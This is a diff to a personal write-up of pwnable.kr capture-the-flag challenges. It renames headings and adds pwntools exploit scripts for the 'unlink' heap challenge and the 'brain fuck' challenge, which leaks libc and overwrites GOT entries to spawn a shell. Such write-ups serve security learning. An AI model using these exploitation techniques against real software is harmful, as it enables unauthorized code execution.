@@ -2,6 +2,8 @@
 
 ## overview
 
+## Toddler's Bottle
+
 I visited `etenal.me`, I looked a truth life. 
 
 `Etenal`found a Linux Kerbnel Local Privilege Escalation Vulnerability.
@@ -80,7 +82,7 @@ The luck is I also like pwn.
 
 Walk by walk in the life!
 
-## fd
+### fd
 
 This game WriteUp is writen after I pass.
 
@@ -141,7 +143,7 @@ sh.send(b"LETMEWIN\n")
 print(sh.recvall())
 ```
 
-## collision
+### collision
 
 This game I take so many time to solve.
 
@@ -223,7 +225,7 @@ sh = pwn_ssh.process(executable=b"./col", argv=["./col", p32(0x6C5CEC8)*4 + p32(
 print(sh.recvall())
 ```
 
-## bof
+### bof
 
 This game I have no solved.
 
@@ -274,7 +276,7 @@ r.sendline(payload)
 r.interactive()
 ```
 
-## flag 
+### flag 
 
 ![image-20220701231149045](assets/image-20220701231149045.png)
 
@@ -320,7 +322,7 @@ Track variable flag, we can found this:
 
 This is the answer.
 
-## passcode
+### passcode
 
 Cool, this game does not provided source code or binary file.
 
@@ -579,7 +581,7 @@ shell.sendline(payload2)
 print(shell.recvall())
 ```
 
-## random
+### random
 
 ![image-20220708100811332](assets/image-20220708100811332.png)
 
@@ -605,7 +607,7 @@ So, We input **3039230856** to do a tring.
 
 I got it.
 
-## input
+### input
 
 ![image-20220708103306380](assets/image-20220708103306380.png)
 
@@ -895,7 +897,7 @@ r.sendline(b"\xde\xad\xbe\xef")
 p.interactive()
 ```
 
-## leg
+### leg
 
 ![image-20220711222240361](assets/image-20220711222240361.png)
 
@@ -1133,7 +1135,7 @@ EXP:
 
 
 
-## mistake 
+### mistake 
 
 ![image-20220714002909995](assets/image-20220714002909995.png)
 
@@ -1246,7 +1248,7 @@ WON!
 
 ![image-20220714104221424](assets/image-20220714104221424.png)
 
-## shellshock
+### shellshock
 
 ![image-20220714141102797](assets/image-20220714141102797.png)
 
@@ -1303,7 +1305,7 @@ He set this:
 
 Then, bashdoor just have shellshock permission. Haha
 
-## coin1
+### coin1
 
 ![image-20220715155028482](assets/image-20220715155028482.png)
 
@@ -1359,7 +1361,7 @@ for i in range(100):
 print(p.recv())
 ```
 
-## blackjack
+### blackjack
 
 ![image-20220717004543944](assets/image-20220717004543944.png)
 
@@ -2176,7 +2178,7 @@ I'd like to win the game.
 
 That's all of blackjack.
 
-## lotto
+### lotto
 
 ![image-20220717014516064](assets/image-20220717014516064.png)
 
@@ -2324,7 +2326,7 @@ for i in range(1000):
         break
 ```
 
-## cmd1
+### cmd1
 
 ![image-20220717033902090](assets/image-20220717033902090.png)
 
@@ -2383,7 +2385,7 @@ And other ways...
 
 flag is **mommy now I get what PATH environment is for :)**
 
-## cmd2
+### cmd2
 
 ![image-20220717041129303](assets/image-20220717041129303.png)
 
@@ -2432,7 +2434,7 @@ cmd2@pwnable:~$
 
 COOL!!!
 
-## uaf
+### uaf
 
 ![image-20220717042843643](assets/image-20220717042843643.png)
 
@@ -2563,7 +2565,7 @@ $ cat flag
 yay_f1ag_aft3r_pwning
 ```
 
-## memcpy
+### memcpy
 
 10 points :D
 
@@ -2748,7 +2750,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## asm
+### asm
 
 ![image-20220722152930746](assets/image-20220722152930746.png)
 
@@ -2856,7 +2858,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## unlink
+### unlink
 
 ![image-20220723224701473](assets/image-20220723224701473.png)
 
@@ -2908,33 +2910,39 @@ int main(int argc, char* argv[]){
 }
 ```
 
+This game took me a lot of time.
+
+It's last game I solved in [Toddler's Bottle] level.
+
+I feel it's easy now.
+
+// DETAILS
+
 EXP: 
 
 ```python
+#!/usr/bin/python3
+# coding=utf-8
+
 from pwn import *
-context.arch = 'i386'    # i386 / arm
-r = process(['/home/unlink/unlink'])
-leak = r.recvuntil('shell!\n')
-stack = int(leak.split('leak: 0x')[1][:8], 16)
-heap = int(leak.split('leak: 0x')[2][:8], 16)
-shell = 0x80484eb
-payload = pack(shell)        # heap + 8  (new ret addr)
-payload += pack(heap + 12)    # heap + 12 (this -4 becomes ESP at ret)
-payload += '3333'        # heap + 16
-payload += '4444'
-payload += pack(stack - 0x20)    # eax. (address of old ebp of unlink) -4
-payload += pack(heap + 16)    # edx.
-r.sendline( payload )
-r.interactive()
+
+# context.log_level = "debug"
+
+shell_addr = 0x080484EB
+
+pwn_ssh = ssh(host="pwnable.kr", port=2222, user="unlink", password="guest")
+p = pwn_ssh.process(executable="./unlink", argv=["./unlink"])
+
+stack_addr = int(p.recvline().strip().split(b"0x")[1], 16)
+heap_addr = int(p.recvline().strip().split(b"0x")[1], 16)
+
+payload = p32(shell_addr) + b"k"*(0x4*3) + p32(heap_addr+(0x4*3)) + p32(stack_addr+0x10)
+
+p.sendline(payload)
+p.interactive()
 ```
 
-
-
-
-
-
-
-## blukat
+### blukat
 
 ![image-20220726151520886](assets/image-20220726151520886.png)
 
@@ -3039,7 +3047,7 @@ We got password.
 
 Input then win.
 
-## horcruxes
+### horcruxes
 
 ![image-20220726152918679](assets/image-20220726152918679.png)
 
@@ -3080,5 +3088,62 @@ for i in range(7):
 r.sendlineafter(b"Select Menu:", str(1))
 r.sendlineafter(b"How many EXP did you earned? : ", str(sum))
 print(r.recvall())
+```
+
+## Rookiss
+
+I AM A ROOKISS!
+
+### brain fuck
+
+![image-20220816034419094](assets/image-20220816034419094.png)
+
+EXP: 
+
+```python
+#!/usr/bin/python3
+# coding=utf-8
+
+from pwn import *
+# context.log_level = "debug"
+
+r = remote("pwnable.kr", 9001)
+libc = ELF("./bf_libc.so")
+
+r.recvuntil(b"type some brainfuck instructions except [ ]\n")
+# leak addr of putchar
+# putchar -> main
+payload  = b"<"*(0x0804A0A0-0x0804A030)
+payload += b"."
+payload += b".>"*0x4
+payload += b"<"*0x4
+payload += b",>"*0x4
+
+# memset -> gets
+payload += b"<"*(0x0804A030-0x0804A02C+4)
+payload += b",>"*0x4
+
+# fgets -> system
+payload += b"<"*(0x0804A02C-0x0804A010+4)
+payload += b",>"*0x4
+
+# ret main
+payload += b"."
+
+r.sendline(payload)
+
+r.recv(1)
+putchar_addr = u32(r.recv(4))
+libc_base = putchar_addr - libc.symbols["putchar"]
+system_addr = libc_base + libc.symbols["system"]
+gets_addr = libc_base + libc.symbols["gets"]
+main_addr = 0x08048671
+
+r.send(p32(main_addr))
+r.send(p32(gets_addr))
+r.send(p32(system_addr))
+r.sendline(b"/bin/sh")
+
+r.interactive()
 ```
 
